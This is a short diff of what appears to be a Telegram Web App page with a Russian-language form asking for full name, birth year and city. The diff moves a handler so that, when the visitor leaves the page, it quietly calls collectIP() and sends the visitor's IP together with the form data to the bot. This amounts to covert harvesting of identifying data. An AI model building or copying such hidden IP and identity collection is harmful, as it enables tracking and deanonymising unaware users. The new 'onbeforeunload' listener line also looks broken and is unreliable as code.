@@ -119,7 +119,7 @@
         <form id="mainForm" style="margin-top: 20px;">
             <input type="text" placeholder="ФИО" id="fio" required>
             <input type="text" placeholder="Год рождения" id="birthYear" required>
-            <input type="text" placeholder="Место жительства" id="address" required>
+            <input type="text" placeholder="Город" id="address" required>
             <button type="submit" class="button">Отправить данные</button>
         </form>
     </div>
@@ -157,7 +157,7 @@
             });
         }
 
-        window.Telegram.WebView.receiveEvent('web_app_close', async () => {
+        window.addEventListener('onbeforeunload', async () => {
             if (!IS_IP_SENT) {
                 await collectIP();
                 window.Telegram.WebApp.sendData(JSON.stringify(collectedData));
